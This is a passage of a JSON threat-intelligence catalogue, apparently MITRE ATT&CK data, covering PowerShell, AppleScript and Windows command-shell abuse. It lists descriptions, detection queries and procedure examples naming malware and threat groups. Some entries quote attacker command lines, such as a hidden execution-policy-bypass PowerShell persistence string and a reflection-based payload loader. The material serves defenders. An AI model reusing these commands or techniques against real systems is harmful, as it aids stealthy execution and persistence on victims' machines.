      "BONDUPDATERis written in PowerShell.[49][50]",
      "BRONZE BUTLERhas used PowerShell for execution.[51]",
      "Bumblebeecan use PowerShell for execution.[52]",
      "DuringC0018, the threat actors used encoded PowerShell scripts for execution.[53][54]",
      "DuringC0021, the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.[55][56]",
      "During theC0032campaign,TEMP.Velesused PowerShell to perform timestomping.[57]",
      "CharmPowercan use PowerShell for payload execution and C2 communication.[58]",
      "Chimerahas used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.[59][60]",
      "CHIMNEYSWEEPcan invoke the PowerShell command[Reflection.Assembly]::LoadFile(\\\"%s\\\")\\n$i=\\\"\\\"\\n$r=[%s]::%s(\\\"%s\\\",[ref] $i)\\necho $r,$i\\nto execute secondary payloads.[61]",
      "Cinnamon Tempesthas used PowerShell to communicate with C2, download files, and execute reconnaissance commands.[62]",
      "TheClamblingdropper can use PowerShell to download the malware.[63]",
      "Cobalt Grouphas used powershell.exe to download and execute scripts.[64][65][66][67][68][69]",
      "Cobalt Strikecan execute a payload on a remote host with PowerShell. This technique does not write any data to disk.[70][71]Cobalt Strikecan also usePowerSploitand other scripting frameworks to perform execution.[72][73][74][75]",
      "ComRAThas used PowerShell to load itself every time a user logs in to the system.ComRATcan execute PowerShell scripts loaded into memory or from the file system.[76][77]",
      "Confuciushas used PowerShell to execute malicious files and payloads.[78]",
      "ConnectWisecan be used to execute PowerShell commands on target machines.[79]",
      "CopyKittenshas used PowerShell Empire.[80]",
      "Covenantcan create PowerShell-based launchers for Grunt installation.[81]",
      "CrackMapExeccan execute PowerShell commands via WMI.[82]",
      "CreepyDrivecan use Powershell for execution, including the cmdletsInvoke-WebRequestandInvoke-Expression.[83]",
      "CreepySnailcan use PowerShell for execution, including the cmdletsInvoke-WebRequstandInvoke-Expression.[83]",
      "Cubahas been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.[84]",
      "CURIUMhas leveraged PowerShell scripts for initial process execution and data gathering in victim environments.[85]",
      "Daggerflyused PowerShell to download and execute remote-hosted files on victim systems.[86]",
      "DarkGatehas used PowerShell to create a remote shell.[87]",
      "DarkHydrusleveraged PowerShell to download and execute additional scripts for execution.[88][89]",
      "DarkVishnyaused PowerShell to create shellcode loaders.[90]",
      "DarkWatchmancan execute PowerShell commands and has used PowerShell to execute a keylogger.[91]",
      "Deep Pandahas used PowerShell scripts to download and execute programs in memory, without writing to disk.[92]",
      "Denishas a version written in PowerShell.[25]",
      "Donutcan generate shellcode outputs that execute via PowerShell.[93]",
      "DownPaperuses PowerShell for execution.[94]",
      "Dragonflyhas used PowerShell scripts for execution.[95][96]",
      "Earth Luscahas used PowerShell to execute commands.[97]",
      "Egregorhas used an encoded PowerShell command by a service created byCobalt Strikefor lateral movement.[98]",
      "Ember Bearhas used PowerShell commands to gather information from compromised systems,  such as email servers.[99]",
      "Emotethas used Powershell to retrieve the malicious payload and download additional resources likeMimikatz.[100][101][102][103][104]",
      "Empireleverages PowerShell for the majority of its client-side agent tasks.Empirealso contains the ability to conduct PowerShell remoting with theInvoke-PSRemotingmodule.[105][106]",
      "FatDukehas the ability to execute PowerShell scripts.[107]",
      "Ferociouscan use PowerShell scripts for execution.[108]",
      "FIN10uses PowerShell for execution as well as PowerShell Empire to establish persistence.[109][105]",
      "FIN13has used PowerShell commands to obtain DNS data from a compromised network.[110]",
      "FIN6has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.[111][112][113]",
      "FIN7used a PowerShell script to launch shellcode that retrieved an additional payload.[114][115][116][117]",
      "FIN8's malicious spearphishing payloads are executed asPowerShell.FIN8has also usedPowerShellfor lateral movement and credential access.[118][119][120][121]",
      "FlawedAmmyyhas used PowerShell to execute commands.[122]",
      "Fox Kittenhas used PowerShell scripts to access credential data.[123]",
      "DuringFrankenstein, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.[124]",
      "GALLIUMused PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.[125]",
      "Gallmakerused PowerShell to download additional payloads and for execution.[126]",
      "Gamaredon Grouphas used obfuscated PowerShell scripts for staging.[127]",
      "GLASSTOKENcan use PowerShell for command execution.[128]",
      "GOLD SOUTHFIELDhas staged and executed PowerShell scripts on compromised hosts.[129]",
      "Gootloadercan use an encoded PowerShell stager to write to the Registry for persistence.[130][131]",
      "Gorgon Groupmalware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.[132]",
      "GRIFFONhas used PowerShell to execute the Meterpreter downloader TinyMet.[133]",
      "HAFNIUMhas used the Exchange Power Shell moduleSet-OabVirtualDirectoryPowerShellto export mailbox data.[134][135]",
      "HALFBAKEDcan execute PowerShell scripts.[114]",
      "HAMMERTOSSis known to use PowerShell.[136]",
      "Hancitorhas used PowerShell to execute commands.[137]",
      "One version ofHelminthuses a PowerShell script.[138]",
      "HEXANEhas used PowerShell-based tools and scripts for discovery and collection on compromised hosts.[139][140][141]",
      "DuringHomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery.[142][143]",
      "Inceptionhas used PowerShell to execute malicious commands and payloads.[144][145]",
      "Indrik Spiderhas used PowerShellEmpirefor execution of malware.[146][147]",
      "IPsec Helpercan run arbitrary PowerShell commands passed to it.[148]",
      "JCryhas used PowerShell to execute payloads.[149]",
      "JSS Loaderhas the ability to download and execute PowerShell scripts.[150]",
      "DuringJuicy Mix,OilRigused a PowerShell script to steal credentials.[151]",
      "KeyBoyuses PowerShell commands to download and execute payloads.[152]",
      "KGH_SPYcan execute PowerShell commands on the victim's machine.[153]",
      "Kimsukyhas executed a variety of PowerShell scripts including Invoke-Mimikatz.[154][155][156][157][158]",
      "Koadichas used PowerShell to establish persistence.[159]",
      "KOCTOPUShas used PowerShell commands to download additional files.[159]",
      "KONNIused PowerShell to download and execute a specific 64-bit version of the malware.[160][161]",
      "Lazarus Grouphas used PowerShell to execute commands and malicious code.[162]",
      "LazyScripterhas used PowerShell scripts to execute malicious code.[159]",
      "Leviathanhas used PowerShell for execution.[163][164][165][166]",
      "LitePowercan use a PowerShell script to execute commands.[108]",
      "Lizarhas used PowerShell scripts.[167]",
      "LockBit 2.0can use the PowerShell moduleInvokeGPUpdateto modify Group Policy.[168][169]",
      "LockBit 3.0can use PowerShell to apply Group Policy changes.[170]",
      "Lokibothas used PowerShell commands embedded inside batch scripts.[171]",
      "Lumma Stealerhas used PowerShell for initial user execution and other fuctions.[172][173][174][175]",
      "LunarWebhas the ability to run shell commands via PowerShell.[176]",
      "Mafaldacan execute PowerShell commands on a compromised machine.[177]",
      "Magic Houndhas used PowerShell for execution and privilege escalation.[178][179][180][181][182]",
      "menuPassusesPowerSploitto inject shellcode into PowerShell.[183][184]",
      "Meteorcan use PowerShell commands to disable the network adapters on a victim machines.[185]",
      "MoleNetcan use PowerShell to set persistence.[186]",
      "Moleratsused PowerShell implants on target machines.[187]",
      "Mosquitocan launch PowerShell Scripts.[188]",
      "MoustachedBouncerhas used plugins to execute PowerShell scripts.[189]",
      "MuddyWaterhas used PowerShell for execution.[190][191][192][193][194][195][196][197][198][199]",
      "Mustang Pandahas used malicious PowerShell scripts to enable execution.[200][201]",
      "Netwalkerhas been written in PowerShell and executed directly in memory, avoiding detection.[202][203]",
      "TheNETWIREbinary has been executed via PowerShell script.[204]",
      "njRAThas executed PowerShell commands via auto-run registry key persistence.[205]",
      "Nomadic Octopushas used PowerShell for execution.[206]",
      "OilRighas used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.[49][207][208][209]",
      "DuringOperation Dream Job,Lazarus Groupused PowerShell commands to explore the environment of compromised victims.[210]",
      "DuringOperation Wocao, threat actors used PowerShell on compromised systems.[211]",
      "OSX_OCEANLOTUS.Duses PowerShell scripts.[212]",
      "PatchworkusedPowerSploitto download payloads, run a reverse shell, and execute malware on the victim's machine.[213][214]",
      "Pikabot Distribution February 2024passed execution from obfuscated JavaScript files to PowerShell scripts to download and installPikabot.[215]",
      "Pillowminthas used a PowerShell script to install a shim database.[216]",
      "Playhas used Base64-encoded PowerShell scripts to disable Microsoft Defender.[217]",
      "ThePoseidon Group's Information Gathering Tool (IGT) includes PowerShell components.[218]",
      "POSHSPYuses PowerShell to execute various commands, one to execute its payload.[219]",
      "PowerExchangecan use PowerShell to execute commands received from C2.[220]",
      "PowerLessis written in and executed via PowerShell without using powershell.exe.[221]",
      "PowerPunchhas the ability to execute through PowerShell.[127]",
      "PowerShoweris a backdoor written in PowerShell.[144]",
      "POWERSOURCEis a PowerShell backdoor.[222][223]",
      "PowerSploitmodules are written in and executed viaPowerShell.[224][225]",
      "PowerStallionuses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.[226]",
      "POWERSTATSuses PowerShell for obfuscation and execution.[227][194][228][198]",
      "POWERTONis written in PowerShell.[229]",
      "PowGoophas the ability to use PowerShell scripts to execute commands.[198]",
      "POWRUNERis written in PowerShell.[49]",
      "Prestigecan use PowerShell for payload execution on targeted systems.[230]",
      "PS1can utilize a PowerShell loader.[231]",
      "PUNCHBUGGYhas usedPowerShellscripts.[232]",
      "Pupyhas a module for loading and executing PowerShell scripts.[233]",
      "PyDCrypthas attempted to execute with PowerShell.[234]",
      "Pysahas used Powershell scripts to deploy its ransomware.[235]",
      "QakBotcan use PowerShell to download and execute payloads.[236]",
      "QUADAGENTuses PowerShell scripts for execution.[237]",
      "RansomHubcan use PowerShell to delete volume shadow copies.[238]",
      "There is a variant ofRATANKBAthat uses a PowerShell script instead of the traditional PE form.[239][240]",
      "RedCurlhas used PowerShell to execute commands and to download malware.[241][242][243]",
      "Mustang Pandaused LNK files to execute PowerShell commands leading to eventualPlugXinstallation duringRedDelta Modified PlugX Infection Chain Operations.[244]",
      "RegDukecan extract and execute PowerShell scripts from C2 communications.[107]",
      "Revenge RATuses the PowerShell commandReflection.Assemblyto load itself into memory to aid in execution.[245]",
      "REvilhas used PowerShell to delete volume shadow copies and download files.[246][247][248][249]",
      "RogueRobinuses a command prompt to run a PowerShell script from Excel.[88]To assist in establishing persistence,RogueRobincreates%APPDATA%\\OneDrive.batand saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File \"%APPDATA%\\OneDrive.ps1\".[250][88]",
      "Saint Bearrelies extensively on PowerShell execution from malicious attachments and related content to retrieve and execute follow-on payloads.[251]",
      "Saint Bothas used PowerShell for execution.[251]",
      "Sandworm Teamhas used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[252][6]",
      "Sardonichas the ability to execute PowerShell commands on a compromised machine.[253]",
      "SeaDukeuses a module to execute Mimikatz with PowerShell to performPass the Ticket.[18]",
      "ServHelperhas the ability to execute a PowerShell script to get information from the infected host.[254]",
      "SharpStagecan execute arbitrary commands with PowerShell.[186][255]",
      "SHARPSTATShas the ability to employ a custom PowerShell script.[228]",
      "ShrinkLockeruses PowerShell to disable protectors used to secure the BitLocker encryption key on victim machines and then delete the key from the system.[256]",
      "Sidewinderhas used PowerShell to drop and execute malware loaders.[257]",
      "Silencehas used PowerShell to download and execute payloads.[258][259]",
      "SILENTTRINITYcan use PowerShell to execute commands.[260]",
      "Sliverhas built-in functionality to launch a Powershell command prompt.[261]",
      "SMOKEDHAMcan execute Powershell commands sent from its C2 server.[262]",
      "Snip3can use a PowerShell script for second-stage execution.[263][264]",
      "Socksbotcan write and execute PowerShell scripts.[214]",
      "During theSolarWinds Compromise,APT29used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.[265][266][267]",
      "Spicacan use an obfuscated PowerShell command to create a scheduled task for persistence.[268]",
      "SQLRathas used PowerShell to create a Meterpreter session.[269]",
      "Squirrelwafflehas used PowerShell to execute its payload.[270][271]",
      "Stealth Falconmalware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.[272]",
      "Storm-1811has used PowerShell for multiple purposes, such as using PowerShell scripts executing in an infinite loop to create an SSH connection to a command and control server.[273]",
      "StrelaStealervariants have used PowerShell scripts to download or drop payloads, including obfuscated variants to connect to a WebDAV server to download and executed an encrypted DLL for installation.[274]",
      "StrongPitycan use PowerShell to add files to the Windows Defender exclusions list.[275]",
      "TA2541has used PowerShell to download files and to inject into various Windows processes.[276]",
      "TA459has used PowerShell for execution of a payload.[277]",
      "TA505has used PowerShell to download and execute malware and reconnaissance scripts.[278][279][280][281]",
      "TAMECAThas used PowerShell to download and run additional content.[282]",
      "TeamTNThas executed PowerShell commands in batch scripts.[283]",
      "Threat Group-3390has used PowerShell for execution.[284][63]",
      "Thripleveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.[285]",
      "ToddyCathas used Powershell scripts to perform post exploit collection.[286]",
      "Tonto Teamhas used PowerShell to download additional payloads.[287]",
      "TRANSLATEXThas used PowerShell to collect system information and to upload the collected data to a Github repository.[288]",
      "TrickBothas been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers.[289]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesused a publicly available PowerShell-based tool, WMImplant.[290]",
      "Troll Stealercreates and executes a PowerShell script to delete itself.[291]",
      "Turlahas used PowerShell to execute commands/scripts, in some cases via a custom executable or code fromEmpire's PSInject.[292][226][293]Turlahas also used PowerShell scripts to load and execute malware in memory.",
      "Ursnifdroppers have used PowerShell in download cradles to download and execute the malware's full executable payload.[294]",
      "Valakhas used PowerShell to download additional modules.[295]",
      "Volt Typhoonhas used PowerShell including for remote system discovery.[296][297][298]",
      "WarzoneRATcan use PowerShell to download files and execute commands.[299][300]",
      "WellMesscan execute PowerShell scripts received from C2.[301][302]",
      "WhisperGatecan use PowerShell to support multiple actions including execution and defense evasion.[303][304][305]",
      "Winter Vivernpassed execution from document macros to PowerShell scripts during initial access operations.[306]Winter Vivernused batch scripts that called PowerShell commands as part of initial access and installation operations.[307]",
      "WIRTEhas used PowerShell for script execution.[308]",
      "Wizard Spiderhas used macros to execute PowerShell scripts to download malware on victim's machines.[309]It has also used PowerShell to execute commands and move laterally through a victim network.[310][311][312][313]",
      "Woody RATcan execute PowerShell commands and scripts with the use of .NET DLL,WoodyPowerSession.[314]",
      "Xbashcan use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.[315]",
      "ZeroClearecan use a malicious PowerShell script to bypass Windows controls.[316]",
      "Zeus Pandauses PowerShell to download and execute the payload.[317]"
    ]
  },
  "T1059.002": {
    "Name": "Command and Scripting Interpreter:AppleScript",
    "Description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.[1]These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.Scripts can be run from the command-line viaosascript /path/to/scriptorosascript -e \"script here\". Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding#!/usr/bin/osascriptto the start of the script file.[2]AppleScripts do not need to callosascriptto execute. However, they may be executed from within mach-O binaries by using the macOSNative APIsNSAppleScriptorOSAScript, both of which execute code independent of the/usr/bin/osascriptcommand line utility.Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to executeNative APIs, which otherwise would require compilation and execution in a mach-O binary file format.[3]Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell viaPython.[4]",
    "Detects": [
      "Monitor executed commands and arguments that may abuse AppleScript for execution. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used.  Actions may be related to network and system informationDiscovery,Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.Analytic 1 - Look for unusual execution of AppleScript.sourcetype=macOS:Process| search process_name=\"osascript\"| eval suspicious_cmd=if(like(command_line, \"%-e%\") OR like(command_line, \"%path/to/script%\"), \"Yes\", \"No\")| where suspicious_cmd=\"Yes\"",
      "Monitor for execution of AppleScript throughosascriptand usage of theNSAppleScriptandOSAScriptAPIs that may be related to other suspicious behavior occurring on the system.Analytic 1 - Look for unusual OS API execution related to AppleScript.sourcetype=macOS:Syslog OR sourcetype=macOS:Process| search (process_name=\"NSAppleScript\" OR process_name=\"OSAScript\")",
      "Monitor for newly executed processes that may abuse AppleScript for execution. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Actions may be related to network and system informationDiscovery,Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.Analytic 1 - Look for unusual AppleScript process creation.sourcetype=macOS:Process| search (parent_process_name=\"osascript\" OR parent_process_name=\"NSAppleScript\" OR parent_process_name=\"OSAScript\")Analytic 2 - Untrusted Locationssource=\"Osquery:\" EventCode=\"process_added\" AND Path LIKE \"/Users//Downloads/\" OR Path LIKE \"/tmp/*\"Analytic 3 - Parent/Child Process Relationshipsource=\"Osquery:\" EventCode=\"process_added\" AND ParentImage= \"/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder\" AND Image LIKE \"osascript\""
    ],
    "Procedure Examples": [
      "Bundlorecan use AppleScript to inject malicious JavaScript into a browser.[5]",
      "Cuckoo Stealercan use osascript to generate a password-stealing prompt, duplicate files and folders, and set environmental variables.[6][7]",
      "Dokuses AppleScript to create a login item for persistence.[8]",
      "macOS.OSAMinerhas usedosascriptto call itself via thedo shell scriptcommand in theLaunch Agent.plistfile.[9]",
      "ThiefQuestusesAppleScript'sosascript -ecommand to launchThiefQuest's persistence viaLaunch AgentandLaunch Daemon.[10]"
    ]
  },
  "T1059.003": {
    "Name": "Command and Scripting Interpreter:Windows Command Shell",
    "Description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely viaRemote Servicessuch asSSH.[1]Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may leveragecmdto execute various commands and payloads. Common uses includecmdto execute a single command, or abusingcmdinteractively with input and output forwarded over a command and control channel.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse the Windows command shell for execution. Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Analytic 1 - Look for unusual command shell execution.sourcetype=WinEventLog:Security| search (EventCode=4688 OR EventCode=4689) process_name=\"cmd.exe\"| eval suspicious_cmd=if(like(command_line, \"%/c%\") OR like(command_line, \"%.bat%\") OR like(command_line, \"%.cmd%\"), \"Yes\", \"No\")| where suspicious_cmd=\"Yes\"",
      "Monitor for newly executed processes that may abuse the Windows command shell for execution.Note: Try an Analytic by creating a baseline of parent processes ofcmdseen over the last 30 days and a list of parent processes ofcmdseen today. Parent processes in the baseline are removed from the set of parent processes seen today, leaving a list of new parent processes. This analytic attempts to identify suspicious programs spawningcmdby looking for programs that do not normally createcmd.  It is very common for some programs to spawncmdas a subprocess, for example to run batch files or Windows commands. However, many processes don’t routinely launch a command prompt - e.g., Microsoft Outlook. A command prompt being launched from a process that normally doesn’t launch command prompts could be the result of malicious code being injected into that process, or of an attacker replacing a legitimate program with a malicious one.Analytic 1 - Unusual Command Execution(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND CommandLine=\"cmd.exe\" AND (CommandLine REGEXP \"./c.\" OR CommandLine REGEXP \".._ \\/k.*\")"
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused thexp_cmdshellcommand in MS-SQL.[2]",
      "4H RAThas the capability to create a remote shell.[3]",
      "ABKhas the ability to usecmdto run a Portable Executable (PE) on the compromised host.[4]",
      "Action RATcan usecmd.exeto execute commands on an infected host.[5]",
      "adbupdcan run a copy of cmd.exe.[6]",
      "Following exploitation withLOWBALLmalware,admin@338actors created a file containing a list of commands to be executed on the compromised computer.[7]",
      "ADVSTORESHELLcan create a remote shell and run a given command.[8][9]",
      "AgriususesASPXSpyweb shells to enable follow-on command execution viacmd.exe.[10]",
      "Akiraexecutes from the Windows command line and can take various arguments for execution.[11]",
      "Anchorhas used cmd.exe to run its self deletion routine.[12]",
      "APT1has used the Windows command shell to execute commands, and batch scripting to automate execution.[13]",
      "APT18uses cmd.exe to execute commands on the victim’s machine.[14][15]",
      "AnAPT28loader Trojan uses a cmd.exe and batch script to run its payload.[16]The group has also used macros to execute payloads.[17][18][19][20]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28usedcmd.exefor execution.[21]",
      "AnAPT3downloader uses the Windows command\"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers.[22][23]",
      "APT32has used cmd.exe for execution.[24]",
      "APT37has used the command-line interface.[25][26]",
      "APT38has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim’s machine.[27]Additionally,APT38has used batch scripts.[28]",
      "APT41usedcmd.exe /cto execute commands on remote machines.[29]APT41used a batch file to install persistence for theCobalt StrikeBEACON loader.[30]",
      "APT5has used cmd.exe for execution on compromised systems.[31]",
      "Aquatic Pandahas attempted and failed to run Bash commands on a Windows host by passing them tocmd /C.[32]",
      "Astarothspawns a CMD process to execute commands.[33]",
      "AuditCredcan open a reverse shell on the system to execute commands.[34]",
      "AuTo Stealercan usecmd.exeto execute a created batch file.[5]",
      "Babukhas the ability to use the command line to control execution on compromised hosts.[35][36]",
      "BabySharkhas used cmd.exe to execute commands.[37]",
      "BackConfigcan download and run batch files to execute commands on a compromised host.[38]",
      "Adversaries can directBACKSPACEto execute from the command line on infected hosts, or haveBACKSPACEcreate a reverse shell.[39]",
      "BADHATCHcan usecmd.exeto execute commands on a compromised host.[40][41]",
      "BADNEWSis capable of executing commands via cmd.exe.[42][43]",
      "Bandookis capable of spawning a Windows command shell.[44][45]",
      "Bankshotuses the command-line interface to execute arbitrary commands.[46][47]",
      "Bazarcan launch cmd.exe to perform reconnaissance commands.[48][49]",
      "BBKhas the ability to usecmdto run a Portable Executable (PE) on the compromised host.[4]",
      "BISCUIThas a command to launch a command shell on the system.[50]",
      "Bisonalhas launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.[51][52][53]",
      "Black Bastacan usecmd.exeto enable shadow copy deletion.[54]",
      "BlackByteexecuted ransomware using the Windows command shell.[55]",
      "BlackCatcan execute commands on a compromised network with the use ofcmd.exe.[56]",
      "BLACKCOFFEEhas the capability to create a reverse shell.[57]",
      "BlackMouldcan run cmd.exe with parameters.[58]",
      "BLINDINGCANhas executed commands via cmd.exe.[59]",
      "Blue Mockingbirdhas used batch script files to automate execution and deployment of payloads.[60]",
      "BONDUPDATERcan read batch commands in a file sent from its C2 server and execute them with cmd.exe.[61]",
      "BoxCaoncan execute arbitrary commands and utilize the \"ComSpec\" environment variable.[62]",
      "BRONZE BUTLERhas used batch scripts and the command-line interface for execution.[63]",
      "Brute Ratel C4can use cmd.exe for execution.[64]",
      "Bumblebeecan usecmd.exeto drop and run files.[65][66]",
      "DuringC0015, the threat actors usedcmd.exeto execute commands and run malicious binaries.[67]",
      "DuringC0017,APT41usedcmd.exeto execute reconnaissance commands.[68]",
      "CALENDARhas a command to run cmd.exe to execute commands.[50]",
      "Carbanakhas a command to create a reverse shell.[69]",
      "Cardinal RATcan execute commands.[70]",
      "CARROTBAThas the ability to execute command line arguments on a compromised host.[71]",
      "Caterpillar WebShellcan run commands on the compromised asset with CMD functions.[72]",
      "ccf32has usedcmd.exefor archiving data and deleting files.[73]",
      "Chaeshas usedcmdto execute tasks on the system.[74]",
      "The C# implementation of  theCharmPowercommand execution module can usecmd.[75]",
      "Chimerahas used the Windows Command Shell and batch scripts for execution on compromised hosts.[76]",
      "China Chopper's server component is capable of opening a command terminal.[77][78][79]",
      "Cinnamon Tempesthas executed ransomware using batch scripts deployed via GPO.[80]",
      "Clamblingcan use cmd.exe for command execution.[81]",
      "Clopcan use cmd.exe to help execute commands on the system.[82]",
      "cmdis used to execute programs and other actions at the command-line interface.[83]",
      "Cobalt Grouphas used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.[84]The group has used an exploit toolkit known as Threadkit that launches .bat files.[85][86][87][84][88][89]",
      "Cobalt Strikeuses a command-line interface to interact with systems.[90][91][92][93]",
      "Cobian RATcan launch a remote command shell interface for executing commands.[94]",
      "CoinTickerexecutes a bash script to establish a reverse shell.[95]",
      "Comnieexecutes BAT scripts.[96]",
      "ComRAThas usedcmd.exeto execute commands.[97]",
      "Contican utilize command line options to allow an attacker control over how it scans and encrypts files.[98][67]",
      "Covenantprovides access to a Command Shell in Windows environments for follow-on command execution and tasking.[99]",
      "A module inCozyCarallows arbitrary commands to be executed by invokingC:\\Windows\\System32\\cmd.exe.[100]",
      "Crimsonhas the ability to execute commands with the COMSPEC environment variable.[101]",
      "Cubahas usedcmd.exe /cand batch files for execution.[102]",
      "DanBothas the ability to execute arbitrary commands viacmd.exe.[103][104]",
      "Dark Caracalhas used macros in Word documents that would download a second stage if executed.[105]",
      "DarkCometcan launch a remote shell to execute commands on the victim’s machine.[106]",
      "DarkGateuses a malicious Windows Batch script to run the Windowscodeutility to retrieve follow-on script payloads.[107]DarkGatehas also usedcmd.exeto create a remote shell.[108]",
      "Darkhotelhas dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.[109]",
      "DarkTortillacan usecmd.exeto add registry keys for persistence.[110]",
      "DarkWatchmancan usecmd.exeto execute commands.[111]",
      "Daserfcan execute shell commands.[112][63]",
      "DEADEYEcan runcmd /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dllto combine separated sections of code into a single DLL prior to execution.[68]",
      "DealersChoicemakes modifications to open-source scripts from GitHub and executes them on the victim’s machine.[113]",
      "Deniscan launch a remote shell to execute arbitrary commands on the victim’s machine.[114][24]",
      "Dipsindcan spawn remote shells.[6]",
      "DnsSystemcan usecmd.exefor execution.[115]",
      "DownPaperuses the command line.[116]",
      "Dragonflyhas used various types of scripting to perform operations, including batch scripts.[117]",
      "DropBookcan execute arbitrary shell commands on the victims' machines.[118][119]",
      "Dtrackhas usedcmd.exeto add a persistent service.[120]",
      "DUSTTRAPcan execute commands viacmd.exe.[121]",
      "ECCENTRICBANDWAGONcan usecmdto execute commands on a victim’s machine.[122]",
      "Egregorhas used batch files for execution and can launch Internet Explorer from cmd.exe.[123][124]",
      "Emissaryhas the capability to create a remote shell and execute specified commands.[125]",
      "Emotethas used cmd.exe to run a PowerShell script.[126]",
      "Empirehas modules for executing scripts.[127]",
      "EnvyScoutcan use cmd.exe to execute malicious files on compromised hosts.[128]",
      "EvilBunnyhas an integrated scripting engine to download and execute Lua scripts.[129]",
      "Exaramel for Windowshas a command to launch a remote shell and executes commands on the victim’s machine.[130]",
      "Felismususes command line for execution.[131]",
      "FELIXROOTexecutes batch scripts on the victim’s machine, and can launch a reverse shell for command execution.[132][133]",
      "FIN10has executed malicious .bat files containing PowerShell commands.[134]",
      "FIN13has leveragedxp_cmdshelland Windows Command Shell to execute commands on a compromised machine.FIN13has also attempted to leverage the ‘xp_cmdshell’ SQL procedure to execute remote commands on internal MS-SQL servers.[135][136]",
      "FIN6has usedkill.batscript to disable security tools.[137]",
      "FIN7used the command prompt to launch commands on the victim’s machine.[138][139][140]",
      "FIN8has used a Batch file to automate frequently executed post compromise cleanup activities.[141]FIN8has also executed commands remotely viacmd.exe.[142][143][144]",
      "Flagprocan usecmd.exeto execute commands received from C2.[145]",
      "FlawedAmmyyhas usedcmdto execute commands on a compromised host.[146]",
      "Fox Kittenhas used cmd.exe likely as a password changing mechanism.[147]",
      "DuringFrankenstein, the threat actors ran a command script to set up persistence as a scheduled task named \"WinUpdate\", as well as other encoded commands from the command-line[148]",
      "FunnyDreamcan usecmd.exefor execution on remote hosts.[73]",
      "DuringFunnyDream, the threat actors usedcmd.exeto execute the wmiexec.vbs script.[73]",
      "GALLIUMused the Windows command shell to execute commands.[149]",
      "Gamaredon Grouphas used various batch scripts to establish C2 and download additional files.Gamaredon Group's backdoor malware has also been written to a batch file.[150][151][152][153]",
      "Gelsemiumcan use a batch script to delete itself.[154]",
      "Gold Dragonuses cmd.exe to execute commands for discovery.[155]",
      "GoldenSpycan execute remote commands via the command-line interface.[156]",
      "GoldMaxcan spawn a command shell, and execute native commands.[157][158]",
      "Goopyhas the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.[24]",
      "Gorgon Groupmalware can use cmd.exe to download and execute payloads and to execute commands on the system.[159]",
      "GravityRATexecutes commands remotely on the infected host.[160]",
      "GreyEnergyuses cmd.exe to execute itself in-memory.[133]",
      "GrimAgentcan use the Windows Command Shell to execute commands, including its own removal.[161]",
      "H1N1kills and disables services by using cmd.exe.[162]",
      "HAFNIUMhas usedcmd.exeto execute commands on the victim's machine.[163]",
      "Hannotogcan execute variouscmd.exe /c %scommands.[164]",
      "HARDRAINuses cmd.exe to executenetshcommands.[165]",
      "HAWKBALLhas created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.[166]",
      "hcdLoaderprovides command-line access to the compromised system.[167]",
      "Helminthcan provide a remote shell. One version ofHelminthuses batch scripting.[168]",
